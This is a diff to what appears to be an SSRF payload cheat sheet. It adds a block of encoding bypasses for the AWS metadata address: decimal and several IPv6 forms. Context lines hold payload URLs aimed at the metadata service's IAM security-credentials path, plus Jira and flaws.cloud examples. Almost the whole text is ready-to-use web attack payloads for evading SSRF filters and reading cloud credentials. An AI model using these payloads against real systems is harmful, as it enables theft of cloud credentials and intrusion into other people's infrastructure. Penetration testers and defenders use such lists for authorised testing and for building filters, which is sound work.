@@ -567,6 +567,14 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
 http://169.254.169.254/latest/dynamic/instance-identity/document
 ```
 
+AWS SSRF Bypasses
+```
+Converted Decimal IP: http://2852039166/latest/meta-data/
+IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
+IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
+IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
+```
+
 E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
 
 E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
